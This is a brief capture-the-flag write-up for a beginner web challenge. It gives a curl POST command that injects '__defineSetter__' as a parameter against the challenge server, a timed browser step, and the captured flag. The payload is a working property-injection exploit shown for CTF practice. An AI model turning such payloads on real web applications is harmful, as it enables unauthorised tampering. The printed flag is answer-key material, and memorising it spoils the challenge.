# Beginner's Web Writeup

## Solution

After you got the session id from the browser, run the following command in your terminal:

    export SESSIONID=(your session id here)
    curl -XPOST http://34.85.124.174:59101/ -d "converter=__defineSetter__&input=FLAG_$SESSIONID"

Then, hit the "Submit" button in the original browser window (quickly!).

## Flag

`TSGCTF{Goo00o0o000o000ood_job!_you_are_rEADy_7o_do_m0re_Web}`